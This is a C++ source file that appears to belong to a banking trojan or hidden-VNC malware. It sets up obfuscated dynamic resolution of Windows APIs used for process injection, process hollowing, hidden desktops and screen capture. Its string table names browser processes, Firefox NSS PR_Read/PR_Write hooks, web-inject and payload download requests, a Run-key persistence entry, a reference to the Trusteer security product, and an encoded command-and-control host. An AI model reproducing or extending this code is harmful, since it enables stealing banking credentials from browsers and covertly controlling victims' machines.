#include "Api.h"
#include "Utils.h"

namespace Funcs
{
   Types::T_CloseHandle                    pCloseHandle;                          
   Types::T_MessageBox                     pMessageBoxA;
   Types::T_GetWindowsDirectory            pGetWindowsDirectoryA;
   Types::T_WideCharToMultiByte            pWideCharToMultiByte;
   Types::T_LocalAlloc                     pLocalAlloc;
   Types::T_wsprintf                       pWsprintfA;
   Types::T_MultiByteToWideChar            pMultiByteToWideChar;
   Types::T_malloc                         pMalloc;
   Types::T_free                           pFree;
   Types::T_VirtualAllocEx                 pVirtualAllocEx;
   Types::T_WriteProcessMemory             pWriteProcessMemory;
   Types::T_CreateRemoteThread             pCreateRemoteThread;
   Types::T_LoadLibrary                    pLoadLibraryA;
   Types::T_GetProcAddress                 pGetProcAddress;
   Types::T_PathRemoveFileSpec             pPathRemoveFileSpecA;
   Types::T_GetModuleFileName              pGetModuleFileNameA;
   Types::T_PathFindFileName               pPathFindFileNameA;
   Types::T_strncmp                        pStrncmp;
   Types::T_strncmp                        pStrnicmp;
   Types::T_lstrlen                        pLstrlenA;
   Types::T_ExitProcess                    pExitProcess;
   Types::T_SHGetFolderPath                pSHGetFolderPathA;
   Types::T_lstrcpy                        pLstrcpyA;
   Types::T_lstrcat                        pLstrcatA;
   Types::T_CopyFile                       pCopyFileA;
   Types::T_GetVolumeInformation           pGetVolumeInformationA;
   Types::T_GetUserNameEx                  pGetUserNameExA;
   Types::T_LookupAccountName              pLookupAccountNameA;
   Types::T_ConvertSidToStringSid          pConvertSidToStringSidA;
   Types::T_LocalFree                      pLocalFree;
   Types::T_memcpy                         pMemcpy;
   Types::T_lstrcmp                        pLstrcmpiA;
   Types::T_lstrcmp                        pLstrcmpA;
   Types::T_StrStr                         pStrStrA;
   Types::T_StrStr                         pStrStrIA;
   Types::T_strtol                         pStrtol;
   Types::T_realloc                        pRealloc;
   Types::T_WSAStartup                     pWSAStartup;
   Types::T_socket                         pSocket;
   Types::T_gethostbyname                  pGethostbyname;
   Types::T_htons                          pHtons;
   Types::T_connect                        pConnect;
   Types::T_send                           pSend;
   Types::T_recv                           pRecv;
   Types::T_closesocket                    pClosesocket;
   Types::T_WSACleanup                     pWSACleanup;
   Types::T_memset                         pMemset;
   Types::T_Sleep                          pSleep;
   Types::T_NtOpenKey                      pNtOpenKey;
   Types::T_NtSetValueKey                  pNtSetValueKey;
   Types::T_RtlCreateUserThread            pRtlCreateUserThread;
   Types::T_CreateProcess                  pCreateProcessA;
   Types::T_InitializeCriticalSection      pInitializeCriticalSection;
   Types::T_LeaveCriticalSection           pLeaveCriticalSection;
   Types::T_EnterCriticalSection           pEnterCriticalSection;
   Types::T_GetLastError                   pGetLastError;
   Types::T_errno                          pErrno;
   Types::T_tolower                        pTolower;
   Types::T_isdigit                        pIsdigit;
   Types::T_strtoul                        pStrtoul;
   Types::T_isxdigit                       pIsxdigit;
   Types::T_strtod                         pStrtod;
   Types::T_CreateToolhelp32Snapshot       pCreateToolhelp32Snapshot;
   Types::T_Process32First                 pProcess32First;
   Types::T_Process32Next                  pProcess32Next;
   Types::T_StrChr                         pStrChrA;
   Types::T_StrToInt                       pStrToIntA;
   Types::T_GetModuleHandle                pGetModuleHandleA;
   Types::T_GetFileVersionInfoSize         pGetFileVersionInfoSizeA;
   Types::T_GetFileVersionInfo             pGetFileVersionInfoA;
   Types::T_VerQueryValue                  pVerQueryValueA;
   Types::T_GetModuleInformation           pGetModuleInformation;
   Types::T_memcmp                         pMemcmp;
   Types::T_ExpandEnvironmentStrings       pExpandEnvironmentStringsA;
   Types::T_GetPrivateProfileSectionNames  pGetPrivateProfileSectionNamesA;
   Types::T_GetPrivateProfileString        pGetPrivateProfileStringA;
   Types::T_CreateFile                     pCreateFileA;
   Types::T_ReadFile                       pReadFile;
   Types::T_WriteFile                      pWriteFile;
   Types::T_RegSetValueEx                  pRegSetValueExA;
   Types::T_RegOpenKeyEx                   pRegOpenKeyExA;
   Types::T_RegCloseKey                    pRegCloseKey;
   Types::T_GetFileSize                    pGetFileSize;
   Types::T_ResumeThread                   pResumeThread;
   Types::T_IsWow64Process                 pIsWow64Process;
   Types::T_GetNativeSystemInfo            pGetNativeSystemInfo;
   Types::T_OpenProcess                    pOpenProcess;
   Types::T_CreateThread                   pCreateThread;
   Types::T_GetUserName                    pGetUserNameW;
   Types::T_GetComputerName                pGetComputerNameW;
   Types::T_GetVersionEx                   pGetVersionExA;
   Types::T_CreateNamedPipe                pCreateNamedPipeA;
   Types::T_ConnectNamedPipe               pConnectNamedPipe;
   Types::T_DisconnectNamedPipe            pDisconnectNamedPipe;
   Types::T_InternetCrackUrl               pInternetCrackUrlA;
   Types::T_GetTempPath                    pGetTempPathA;
   Types::T_GetTempFileName                pGetTempFileNameA;
   Types::T_ShellExecute                   pShellExecuteA;
   Types::T_ioctlsocket                    pIoctlsocket;
   Types::T_ntohs                          pNtohs;
   Types::T_CreateMutex                    pCreateMutexA;
   Types::T_ReleaseMutex                   pReleaseMutex;
   Types::T_NtCreateThreadEx               pNtCreateThreadEx;
   Types::T_TerminateProcess               pTerminateProcess;
   Types::T_FindWindow                     pFindWindowA;
   Types::T_GetWindowThreadProcessId       pGetWindowThreadProcessId;
   Types::T_WaitForSingleObject            pWaitForSingleObject;
   Types::T_EnumWindows                    pEnumWindows;
   Types::T_GetCurrentProcessId            pGetCurrentProcessId;
   Types::T_DeleteFile                     pDeleteFileA;
   Types::T_PathFileExists                 pPathFileExistsA;
   Types::T_CreateDirectory                pCreateDirectoryA;
   Types::T_HttpQueryInfo                  pHttpQueryInfoA;
   Types::T_HttpQueryInfo                  pHttpQueryInfoW;
   Types::T_RtlCompressBuffer              pRtlCompressBuffer;
   Types::T_RtlGetCompressionWorkSpaceSize pRtlGetCompressionWorkSpaceSize;
   Types::T_SetThreadDesktop               pSetThreadDesktop;
   Types::T_CreateDesktop                  pCreateDesktopA;
   Types::T_OpenDesktop                    pOpenDesktopA;
   Types::T_TerminateThread                pTerminateThread;
   Types::T_PostMessage                    pPostMessageA;
   Types::T_PostMessage                    pSendMessageA;
   Types::T_ChildWindowFromPoint           pChildWindowFromPoint;
   Types::T_ScreenToClient                 pScreenToClient;
   Types::T_MoveWindow                     pMoveWindow;
   Types::T_GetWindowRect                  pGetWindowRect;
   Types::T_GetMenuItemID                  pGetMenuItemID;
   Types::T_MenuItemFromPoint              pMenuItemFromPoint;
   Types::T_RealGetWindowClass             pRealGetWindowClassA;
   Types::T_PtInRect                       pPtInRect;
   Types::T_GetWindowPlacement             pGetWindowPlacement;
   Types::T_SetWindowLong                  pSetWindowLongA;
   Types::T_GetWindowLong                  pGetWindowLongA;
   Types::T_WindowFromPoint                pWindowFromPoint;
   Types::T_SHAppBarMessage                pSHAppBarMessage;
   Types::T_RegQueryValueEx                pRegQueryValueExA;
   Types::T_GetDesktopWindow               pGetDesktopWindow;
   Types::T_DeleteDC                       pDeleteDC;
   Types::T_ReleaseDC                      pReleaseDC;
   Types::T_DeleteObject                   pDeleteObject;
   Types::T_GetDIBits                      pGetDIBits;
   Types::T_StretchBlt                     pStretchBlt;
   Types::T_SetStretchBltMode              pSetStretchBltMode;
   Types::T_SelectObject                   pSelectObject;
   Types::T_CreateCompatibleDC             pCreateCompatibleDC;
   Types::T_CreateCompatibleBitmap         pCreateCompatibleBitmap;
   Types::T_GetDC                          pGetDC;
   Types::T_IsWindowVisible                pIsWindowVisible;
   Types::T_GetWindow                      pGetWindow;
   Types::T_BitBlt                         pBitBlt;
   Types::T_PrintWindow                    pPrintWindow;
   Types::T_GetTopWindow                   pGetTopWindow;
   Types::T_NtUnmapViewOfSection           pNtUnmapViewOfSection;
   Types::T_NtQueryInformationProcess      pNtQueryInformationProcess;
   Types::T_GetThreadContext               pGetThreadContext;
   Types::T_SetThreadContext               pSetThreadContext;
   Types::T_SHFileOperation                pSHFileOperationA;
   Types::T_FindFirstFile                  pFindFirstFileA;
   Types::T_FindNextFile                   pFindNextFileA;
};

namespace Strs
{
   const char *host[128];
   const char *path;

   const char *user32;
   const char *kernelBase;
   const char *kernel32;
   const char *msvcrt;
   const char *ntdll;
   const char *shlwapi;
   const char *shell32;
   const char *secur32;
   const char *advapi32;
   const char *ws2_32;
   const char *version;
   const char *psapi;
   const char *wininet;
   const char *gdi32;

   wchar_t *wKernelBase;
   wchar_t *wKernel32;
   wchar_t *wNtdll;
   wchar_t *wWininet;

   const char *messageBoxA;
   const char *getWindowsDirectoryA;
   const char *wideCharToMultiByte;
   const char *localAlloc;
   const char *wsprintfA;
   const char *multiByteToWideChar;
   const char *malloc;
   const char *free;
   const char *virtualAllocEx;
   const char *writeProcessMemory;
   const char *createRemoteThread;
   const char *loadLibraryA;
   const char *getProcAddress;
   const char *pathRemoveFileSpecA;
   const char *getModuleFileNameA;    
   const char *pathFindFileNameA;
   const char *strncmp;
   const char *strnicmp;
   const char *lstrlenA;
   const char *exitProcess;
   const char *shGetFolderPathA;
   const char *lstrcpyA;
   const char *lstrcatA;
   const char *copyFileA;
   const char *getVolumeInformationA;
   const char *getUserNameExA;
   const char *lookupAccountNameA;
   const char *convertSidToStringSidA; 
   const char *localFree;
   const char *memcpy;
   const char *lstrcmpiA;
   const char *lstrcmpA;
   const char *strStrA;
   const char *strStrIA;
   const char *strtol;
   const char *realloc;
   const char *wsaStartup;
   const char *socket;
   const char *gethostbyname;
   const char *htons;
   const char *connect;
   const char *send;
   const char *recv;
   const char *closesocket;
   const char *wsaCleanup;
   const char *memset;
   const char *sleep;
   const char *ntOpenKey;
   const char *ntSetValueKey;
   const char *closeHandle;
   const char *createProcessA;
   const char *enterCriticalSection;
   const char *leaveCriticalSection;
   const char *getLastError;
   const char *initializeCriticalSection;
   const char *_errNo;
   const char *toLower;
   const char *isDigit;
   const char *strToul;
   const char *isXdigit;
   const char *strTod;
   const char *createToolhelp32Snapshot;
   const char *process32First;
   const char *process32Next;
   const char *strChrA;
   const char *strToIntA;
   const char *getModuleHandleA;
   const char *getFileVersionInfoSizeA;
   const char *getFileVersionInfoA;
   const char *verQueryValueA;
   const char *getModuleInformation;
   const char *memcmp;
   const char *expandEnvironmentStringsA;
   const char *getPrivateProfileSectionNamesA;
   const char *getPrivateProfileStringA;
   const char *createFileA;
   const char *readFile;
   const char *writeFile;
   const char *regSetValueExA;
   const char *regOpenKeyExA;
   const char *regCloseKey;
   const char *getFileSize;
   const char *resumeThread;
   const char *isWow64Process;
   const char *getNativeSystemInfo;
   const char *openProcess;
   const char *createThread;
   const char *getUserNameW;
   const char *getComputerNameW;
   const char *getVersionExA;
   const char *createNamedPipeA;
   const char *connectNamedPipe;
   const char *disconnectNamedPipe;
   const char *internetCrackUrlA;
   const char *getTempPathA;
   const char *getTempFileNameA;
   const char *shellExecuteA;
   const char *ioctlsocket;
   const char *ntohs;
   const char *createMutexA;
   const char *releaseMutex;
   const char *ntCreateThreadEx;
   const char *terminateProcess;
   const char *findWindowA;
   const char *getWindowThreadProcessId;
   const char *waitForSingleObject;
   const char *enumWindows;
   const char *getCurrentProcessId;
   const char *deleteFileA;
   const char *pathFileExistsA;
   const char *createDirectoryA;
   const char *httpQueryInfoA;
   const char *httpQueryInfoW;
   const char *rtlCompressBuffer;
   const char *rtlGetCompressionWorkSpaceSize;
   const char *setThreadDesktop;
   const char *createDesktopA;
   const char *openDesktopA;
   const char *terminateThread;
   const char *postMessageA;
   const char *sendMessageA;
   const char *childWindowFromPoint;
   const char *screenToClient;
   const char *moveWindow;
   const char *getWindowRect;
   const char *getMenuItemID;
   const char *menuItemFromPoint;
   const char *realGetWindowClassA;
   const char *ptInRect;
   const char *getWindowPlacement;
   const char *setWindowLongA;
   const char *getWindowLongA;
   const char *windowFromPoint;
   const char *shAppBarMessage;
   const char *regQueryValueExA;
   const char *getDesktopWindow;
   const char *deleteDc;
   const char *releaseDc;
   const char *deleteObject;
   const char *getDiBits;
   const char *stretchBlt;
   const char *setStretchBltMode;
   const char *selectObject;
   const char *createCompatibleDc;
   const char *createCompatibleBitmap;
   const char *getDc;
   const char *isWindowVisible;
   const char *getWindow;
   const char *bitBlt;
   const char *printWindow;
   const char *getTopWindow;
   const char *ntUnmapViewOfSection;
   const char *ntQueryInformationProcess;
   const char *getThreadContext;
   const char *setThreadContext;
   const char *shFileOperationA;
   const char *findFirstFileA;
   const char *findNextFileA;

   const char *rtlInitAnsiString;           
   const char *rtlAnsiStringToUnicodeString;     
   const char *ldrLoadDll;
   const char *ldrGetProcedureAddress;
   const char *rtlFreeUnicodeString;
   const char *rtlCreateUserThread;                                                  

   const char *helloWorld;
   const char *exeExt;
   const char *fileDiv;
   const char *postSpace;
   const char *getSpace;
   const char *httpReq1;
   const char *httpReq2;
   const char *httpReq3;
   const char *httpReq4;
   const char *httpReq5;
   const char *httpReq6;
   const char *httpReq7;
   const char *httpReq8;
   const char *httpReq9;
   const char *sprintfIntEscape;
   const char *winNewLine;
   const char *ntRegPath;
   const char *userRunKey;
   const char *dllhostExe;
   const char *pingRequest;
   const char *dll32binRequest;
   const char *dll64binRequest;
   const char *explorerExe;
   const char *firefoxExe;
   const char *chromeExe;
   const char *edgeExe;
   const char *braveExe;
   const char *iexploreExe;
   const char *powershell;
   const char *injectsRequest;
   const char *chromeName;
   const char *firefoxName;
   const char *ieName;
   const char *chromeDll;
   const char *nss3dll;
   const char *nspr4dll;
   const char *prRead;
   const char *prWrite;
   const char *rdata;
   const char *fc1;
   const char *fc2;
   const char *fc3;
   const char *fc4;
   const char *fc5;
   const char *fc6;
   const char *fc7;
   const char *fc8;
   const char *fc9;
   const char *fc10;
   const char *fc11;
   const char *fc12;
   const char *headersEnd;
   const char *bu1;
   const char *bu2;
   const char *bu3;
   const char *bu4;
   const char *bu5;
   const char *ie1;
   const char *ie2;
   const char *ie3;
   const char *ie4;
   const char *ie5;
   const char *ie6;
   const char *ie7;
   const char *ie8;
   const char *ie9;
   const char *ie10;
   const char *ie11;
   const char *exp1;
   const char *exp2;
   const char *exp3;
   const char *exp4;
   const char *exp5;
   const char *exp6;
   const char *exp7;
   const char *exp8;
   const char *exp9;
   const char *exp10;
   const char *exp11;
   const char *exp12;
   const char *exp13;
   const char *exp14;
   const char *exp15;
   const char *exp16;
   const char *exp17;
   const char *exp18;
   const char *exp19;
   const char *exp20;
   const char *exp21;
   const char *exp22;
   const char *exp23;
   const char *exp24;
   const char *exp25;
   const char *hd1;
   const char *hd2;
   const char *hd3;
   const char *hd4;
   const char *hd5;
   const char *hd6;
   const char *hd7;
   const char *hd8;
   const char *hd9;
   const char *hd10;
   const char *hd11;
   const char *hd12;
   const char *hd13;
   const char *hd14;
   const char *hd15;
   const char *infoRequest;
   const char *pipeName;
   const char *open;
   const char *hi;
   const char *shell_TrayWnd;
   const char *verclsidExe;
   const char *dll32cachePrefix;
   const char *dll64cachePrefix;
   const char *loaderDllName;
   const char *zoneId;
   const char *trusteer;

   wchar_t *wNss3dll;
   wchar_t *wNspr4dll;
};

void InitApi()
{
   //Strs::host[0] = UnEnc("\x0079\x0003\x0006\x006D\x0063\x007D\x0001\x0062\x0005", "H11CSS1L4", 9);
  // Strs::host[1] = 0;

   //Strs::path = UnEnc("\x0066\x0025\x002F\x0057\x0035\x003B\x0065\x0020\x002F\x0033\x003D\x0022\x003F\x007C\x0022\x0038\x0047", "IUN9PWJCCZXLKRRP7", 17);

   Strs::user32     = UnEnc("\x001F\x0034\x0022\x0040\x0004\x0074\x0062\x003C\x003C\x0028", "JGG27FLXPD", 10);
   Strs::kernel32   = UnEnc("\x0019\x0020\x0026\x005B\x002D\x0024\x007C\x0075\x0061\x0027\x005D\x0021", "RET5HHOGOC1M", 12);
   Strs::kernelBase = UnEnc("\x007F\x0035\x0040\x005F\x0028\x0025\x0005\x0057\x0038\x002E\x0079\x0032\x0026\x0039", "4P21MIG6KKWVJU", 14);
   Strs::msvcrt     = UnEnc("\x002B\x0030\x003A\x0033\x0030\x0038\x006F\x0037\x005D\x0054", "FCLPBLAS18", 10);
   Strs::ntdll      = UnEnc("\x003D\x0040\x0035\x0029\x005A\x0062\x0027\x0022\x002A", "S4QE6LCNF", 9);
   Strs::shlwapi    = UnEnc("\x0065\x0025\x005C\x0036\x0026\x0043\x002D\x007F\x0037\x005F\x0024", "6M0AG3DQS3H", 11);
   Strs::shell32    = UnEnc("\x0000\x0050\x0033\x003B\x002E\x007E\x0006\x0017\x0025\x003D\x0021", "S8VWBM49AQM", 11);
   Strs::secur32    = UnEnc("\x001F\x003D\x0057\x003C\x0020\x0002\x0071\x0017\x005C\x0024\x0026", "LX4IR1C98HJ", 11);
   Strs::advapi32   = UnEnc("\x0011\x002A\x003E\x0031\x0032\x002C\x0065\x000A\x001B\x0036\x0035\x0039", "PNHPBEV85RYU", 12);
   Strs::ws2_32     = UnEnc("\x0026\x0026\x007B\x006B\x0070\x0066\x007F\x0020\x0021\x0036", "QUI4CTQDMZ", 10);
   Strs::version    = UnEnc("\x0022\x0024\x0031\x0035\x0051\x0023\x0023\x0060\x0030\x0059\x002D", "TACF8LMNT5A", 11);
   Strs::psapi      = UnEnc("\x0019\x0020\x0028\x003F\x003E\x0065\x0054\x0022\x002F", "ISIOWK0NC", 9);
   Strs::wininet    = UnEnc("\x0022\x005D\x0039\x002D\x0021\x003C\x003E\x0019\x0025\x003C\x003F", "U4WDOYJ7APS", 11);
   Strs::gdi32      = UnEnc("\x0023\x0052\x0059\x0000\x007A\x0063\x0052\x002B\x0026", "D603HM6GJ", 9);

   Strs::messageBoxA               = UnEnc("\x001B\x0037\x004B\x0040\x0034\x002F\x0027\x0003\x003F\x0028\x000B", "VR83UHBAPPJ", 11);
   Strs::getWindowsDirectoryA      = UnEnc("\x0077\x0055\x003F\x0012\x0033\x0021\x005D\x005E\x003C\x0030\x000B\x0027\x0036\x0028\x0055\x0039\x005D\x003D\x0031\x000A", "00KEZO91KCONDM6M2OHK", 20);
   Strs::wideCharToMultiByte       = UnEnc("\x0018\x003D\x0021\x0034\x0007\x005D\x0053\x0026\x001C\x0038\x0007\x0026\x0039\x0033\x0058\x000C\x002E\x0023\x0020", "OTEQD52THWJSUG1NWWE", 19);
   Strs::localAlloc                = UnEnc("\x007F\x0022\x0025\x0057\x0024\x0009\x0028\x0059\x003E\x003B", "3MF6HHD5QX", 10);
   Strs::wsprintfA                 = UnEnc("\x0043\x003A\x0026\x003A\x002F\x005B\x0033\x0031\x0072", "4IVHF5GW3", 9);
   Strs::multiByteToWideChar       = UnEnc("\x000C\x0046\x003A\x0025\x003C\x001A\x004A\x0042\x0056\x0062\x0039\x0003\x0033\x0023\x002E\x000C\x005F\x0028\x002A", "A3VQUX3636VTZGKO7IX", 19);
   Strs::malloc                    = UnEnc("\x005B\x002B\x002D\x002D\x0022\x0055", "6JAAM6", 6);
   Strs::free                      = UnEnc("\x002B\x003C\x003D\x002E", "MNXK", 4);
   Strs::virtualAllocEx            = UnEnc("\x0019\x0025\x0027\x0045\x0046\x0037\x0027\x0008\x005A\x003A\x0026\x002C\x000E\x0033", "OLU13VKI6VIOKK", 14);
   Strs::writeProcessMemory        = UnEnc("\x006F\x0047\x002D\x0031\x0026\x001B\x0041\x0027\x0034\x0031\x0029\x0027\x000C\x0057\x0027\x003A\x003A\x0033", "85DECK3HWTZTA2JUHJ", 18);
   Strs::createRemoteThread        = UnEnc("\x0005\x0025\x002A\x0037\x0035\x0057\x0064\x0030\x0054\x0028\x0036\x003D\x001B\x003B\x004B\x0055\x0022\x0035", "FWOVA26U9GBXOS90CQ", 18);
   Strs::loadLibraryA              = UnEnc("\x007E\x0027\x002D\x0029\x001E\x0021\x003B\x0030\x0023\x0038\x002F\x0012", "2HLMRHYBBJVS", 12);
   Strs::getProcAddress            = UnEnc("\x007F\x0028\x003A\x0069\x003B\x0037\x0056\x000C\x0051\x0028\x003B\x0036\x003F\x0024", "8MN9IX5M5LISLW", 14);
   Strs::pathRemoveFileSpecA       = UnEnc("\x0016\x0059\x0031\x002F\x0007\x002E\x005D\x005D\x0047\x0024\x007E\x005B\x002A\x002D\x0065\x0048\x0055\x003B\x0079", "F8EGUK021A82FH680X8", 19);
   Strs::getModuleFileNameA        = UnEnc("\x0015\x002D\x002E\x0006\x0020\x002F\x0039\x0058\x003F\x0013\x003B\x0055\x0057\x000C\x0055\x002F\x0055\x0076", "RHZKOKL4ZUR92B4B07", 18);
   Strs::pathFindFileNameA         = UnEnc("\x0065\x003B\x0038\x0059\x0001\x003C\x0023\x0026\x0017\x003A\x0035\x0035\x0078\x0034\x0038\x0031\x0072", "5ZL1GUMBQSYP6UUT3", 17);
   Strs::strncmp                   = UnEnc("\x0023\x0024\x002A\x0034\x0055\x0027\x0020", "PPXZ6JP", 7);
   Strs::strnicmp                  = UnEnc("\x001D\x003B\x003F\x0030\x0028\x0059\x0028\x002B\x0037", "BHKBF0KFG", 9);
   Strs::lstrlenA                  = UnEnc("\x002E\x0047\x004C\x002A\x005C\x0027\x0028\x0079", "B48X0BF8", 8);
   Strs::exitProcess               = UnEnc("\x000B\x004B\x005B\x0033\x001A\x002B\x0059\x002C\x002F\x003A\x0023", "N32GJY6OJIP", 11);
   Strs::shGetFolderPathA          = UnEnc("\x0005\x000B\x000F\x005C\x0025\x0073\x005F\x0054\x002E\x002E\x0044\x0060\x0029\x0027\x0022\x0074", "VCH9Q508JK60HSJ5", 16);
   Strs::lstrcpyA                  = UnEnc("\x0036\x0024\x0041\x0036\x002D\x003B\x0023\x000C", "ZW5DNKZM", 8);
   Strs::lstrcatA                  = UnEnc("\x002F\x0022\x003D\x0043\x0037\x002E\x002C\x0074", "CQI1TOX5", 8);
   Strs::copyFileA                 = UnEnc("\x0011\x005A\x0024\x003C\x0075\x005C\x003F\x0054\x0078", "R5TE35S19", 9);
   Strs::getVolumeInformationA     = UnEnc("\x0004\x0053\x002C\x0007\x002B\x0039\x002C\x002C\x0057\x000E\x005F\x0028\x0029\x0030\x0021\x002F\x0040\x005F\x0056\x0036\x0078", "C6XQDUYA2G1NFBLN469X9", 21);
   Strs::getUserNameExA            = UnEnc("\x0008\x0051\x002C\x0014\x003A\x0028\x004A\x000B\x0023\x0059\x0020\x0000\x003C\x000D", "O4XAIM8EB4EEDL", 14);
   Strs::lookupAccountNameA        = UnEnc("\x0003\x002C\x005A\x0053\x0040\x0025\x0071\x0052\x002A\x005A\x0026\x0022\x0040\x0007\x0050\x0055\x005C\x0012", "OC585U01I5SL4I189S", 18);
   Strs::convertSidToStringSidA    = UnEnc("\x0006\x002E\x0036\x0034\x005C\x0023\x0041\x001A\x0033\x0051\x0064\x0022\x000B\x003E\x0031\x0059\x0059\x002B\x006A\x005E\x0021\x0002", "EAXB9Q5IZ50MXJC07L97EC", 22);
   Strs::localFree                 = UnEnc("\x0005\x0037\x0034\x0053\x003F\x0070\x0021\x0055\x002B", "IXW2S6S0N", 9);
   Strs::malloc                    = UnEnc("\x002E\x0054\x003A\x0055\x002C\x003B", "C5V9CX", 6);
   Strs::lstrcmpiA                 = UnEnc("\x0021\x0030\x0024\x0036\x003B\x0058\x0044\x0028\x0074", "MCPDX54A5", 9);
   Strs::lstrcmpA                  = UnEnc("\x0025\x003A\x003E\x0036\x002F\x003D\x0049\x0003", "IIJDLP9B", 8);
   Strs::strStrA                   = UnEnc("\x001C\x0036\x0043\x006A\x003B\x003A\x0076", "OB19OH7", 7);
   Strs::strStrIA                  = UnEnc("\x006B\x002E\x004B\x0001\x002D\x0020\x000B\x000B", "8Z9RYRBJ", 8);
   Strs::strtol                    = UnEnc("\x004A\x0037\x0027\x003D\x003B\x005F", "9CUIT3", 6);
   Strs::realloc                   = UnEnc("\x0023\x002D\x002F\x0034\x005C\x003A\x0029", "QHNX0UJ", 7);
   Strs::wsaStartup                = UnEnc("\x0000\x001C\x000E\x0064\x0030\x0052\x003A\x004C\x003E\x0028", "WOO7D3H8KX", 10);
   Strs::socket                    = UnEnc("\x004B\x005A\x0031\x002D\x0052\x0041", "85RF75", 6);
   Strs::gethostbyname             = UnEnc("\x002A\x0028\x003B\x002F\x0056\x0039\x0035\x0053\x0031\x003E\x0029\x005A\x0051", "MMOG9JA1HPH74", 13);
   Strs::htons                     = UnEnc("\x0027\x0039\x0036\x0036\x002B", "OMYXX", 5);
   Strs::connect                   = UnEnc("\x002F\x0023\x003B\x003A\x0030\x003B\x0040", "LLUTUX4", 7);
   Strs::send                      = UnEnc("\x003F\x003C\x003E\x0033", "LYPW", 4);
   Strs::recv                      = UnEnc("\x003C\x0026\x003A\x0022", "NCYT", 4);
   Strs::closesocket               = UnEnc("\x002F\x002D\x0023\x003F\x002B\x0038\x0021\x002D\x0033\x0055\x002C", "LALLNKNNX0X", 11);
   Strs::wsaCleanup                = UnEnc("\x0000\x0019\x0005\x0075\x0020\x002E\x0029\x005A\x0046\x0027", "WJD6LKH43W", 10);
   Strs::memset                    = UnEnc("\x0026\x0057\x005C\x0042\x0029\x002C", "K211LX", 6);
   Strs::memcpy                    = UnEnc("\x003B\x0033\x0028\x0050\x003E\x002A", "VVE3NS", 6);
   Strs::sleep                     = UnEnc("\x001C\x003F\x002B\x0024\x003D", "OSNAM", 5);
   Strs::ntOpenKey                 = UnEnc("\x0004\x003A\x0077\x0047\x0052\x005D\x007C\x0027\x002F", "JN87737BV", 9);
   Strs::ntSetValueKey             = UnEnc("\x0006\x0045\x0017\x0028\x0032\x001F\x0054\x005B\x0037\x002C\x001E\x0030\x003A", "H1DMFI57BIUUC", 13);
   Strs::closeHandle               = UnEnc("\x0014\x005D\x005D\x0020\x0052\x0002\x0025\x005B\x0032\x0038\x002E", "W12S7JD5VTK", 11);
   Strs::createProcessA            = UnEnc("\x0074\x004A\x0034\x0055\x002D\x002B\x0069\x0041\x005F\x0053\x0035\x0040\x0021\x0073", "78Q4YN9300P3R2", 14);
   Strs::ntCreateThreadEx          = UnEnc("\x0016\x0032\x0014\x0020\x0037\x0027\x0025\x0054\x001C\x0058\x0035\x0023\x002E\x0051\x001D\x004F", "XFWRRFQ1H0GFO5X7", 16);
   Strs::terminateProcess          = UnEnc("\x0064\x0032\x003A\x005E\x0026\x0026\x0050\x0036\x002C\x0008\x003B\x005F\x0057\x0029\x0034\x004B", "0WH3OH1BIXI04LG8", 16);
   Strs::findWindowA               = UnEnc("\x000D\x0059\x0024\x0021\x0005\x0027\x002A\x002B\x005B\x0031\x0070", "K0JERNDO4F1", 11);
   Strs::ntUnmapViewOfSection      = UnEnc("\x0014\x002C\x0001\x0057\x0028\x0026\x0042\x0017\x005A\x0033\x002E\x0000\x0037\x001C\x0033\x002A\x0040\x005F\x0035\x0059", "ZXT9EG2A3VYOQOVI46Z7", 20);
   Strs::ntQueryInformationProcess = UnEnc("\x007B\x0021\x0018\x0040\x003D\x0025\x002A\x0018\x0023\x0035\x005C\x004A\x0024\x0031\x0036\x0027\x0036\x0036\x0015\x0027\x002D\x002F\x002B\x003D\x0025", "5UI5XWSQMS38IPBNYXEUBLNNV", 25);
   Strs::getThreadContext          = UnEnc("\x000A\x0056\x0044\x0061\x002E\x0038\x0037\x0024\x002D\x0075\x0029\x003E\x002D\x0029\x002A\x002C", "M305FJREI6FPYLRX", 16);
   Strs::setThreadContext          = UnEnc("\x001E\x003C\x003F\x0066\x0032\x0034\x0024\x002C\x002C\x0017\x0028\x005C\x0032\x0050\x002C\x0033", "MYK2ZFAMHTG2F5TG", 16);
   Strs::shFileOperationA          = UnEnc("\x0066\x0002\x000A\x005B\x005E\x0030\x0007\x003A\x0029\x0046\x0020\x0020\x005C\x0057\x002F\x000C", "5JL22UHJL4AT58AM", 16);
   Strs::findFirstFileA            = UnEnc("\x0011\x005E\x0034\x003C\x0005\x003C\x0044\x0034\x0046\x0008\x0030\x003A\x0026\x001B", "W7ZXCU6G2NYVCZ", 14);
   Strs::findNextFileA             = UnEnc("\x007F\x0027\x0023\x005C\x001A\x0035\x0041\x002E\x0072\x0058\x003D\x0024\x0010", "9NM8TP9Z41QAQ", 13);

   Strs::getWindowThreadProcessId = UnEnc("\x0072\x0023\x0026\x0006\x0020\x003A\x0050\x0028\x003E\x0013\x005E\x0036\x002E\x002F\x0022\x0069\x0022\x0059\x0035\x0022\x0024\x0046\x001E\x002C", "5FRQIT4GIG6DKNF9P6VGW5WH", 24);

   Strs::initializeCriticalSection = UnEnc("\x007F\x003E\x003F\x0039\x005E\x0022\x005B\x002E\x0038\x0020\x0002\x0030\x0025\x0042\x0039\x0021\x0028\x003F\x0063\x002D\x0033\x0040\x0023\x002D\x005A", "6PVM7C7GBEABL6PBIS0HP4JB4", 25);
   Strs::getLastError              = UnEnc("\x001D\x0035\x0041\x0078\x0055\x0047\x004D\x0016\x0038\x0027\x005C\x0045", "ZP54449SJU37", 12);
   Strs::enterCriticalSection      = UnEnc("\x0017\x0024\x0032\x002C\x0042\x0001\x0035\x0024\x0031\x0030\x0030\x0033\x0039\x0064\x0021\x0026\x0024\x0058\x002D\x0029", "RJFI0BGMEYSRU7DEP1BG", 20);
   Strs::leaveCriticalSection      = UnEnc("\x0018\x0036\x0029\x002E\x0027\x000F\x003A\x0023\x0036\x003A\x0020\x002C\x003A\x0016\x0055\x0029\x0022\x0051\x0035\x005C", "TSHXBLHJBSCMVE0JV8Z2", 20);

   Strs::_errNo                    = UnEnc("\x001C\x003F\x0042\x0030\x0058\x0020", "CZ0B6O", 6);
   Strs::toLower                   = UnEnc("\x003F\x0059\x005D\x005A\x0034\x0036\x0021", "K615CSS", 7);
   Strs::isDigit                   = UnEnc("\x0031\x003C\x005D\x002B\x0034\x002E\x003B", "XO9BSGO", 7);
   Strs::strToul                   = UnEnc("\x0047\x0043\x0039\x0022\x0038\x0032\x0059", "47KVWG5", 7);
